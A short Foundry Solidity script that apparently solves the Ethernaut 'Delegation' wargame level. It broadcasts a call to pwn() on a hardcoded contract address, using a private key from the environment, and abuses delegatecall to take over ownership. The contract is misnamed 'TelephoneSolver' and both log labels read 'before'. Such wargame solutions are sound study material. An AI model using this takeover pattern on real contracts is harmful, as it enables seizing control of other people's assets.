// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Delegation } from "../src/Delegation.sol";

contract TelephoneSolver is Script {

    Delegation public instance = Delegation(payable(0x3b3dA2143744c7e1ad26F61C6CdF64c13A0eC236));

	uint256 prv = vm.envUint("PRV");
	address pub = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        
        console.log("before -->", instance.owner());
        address(instance).call(abi.encodeWithSignature("pwn()"));
        console.log("before -->", instance.owner());

        vm.stopBroadcast();
    }

}

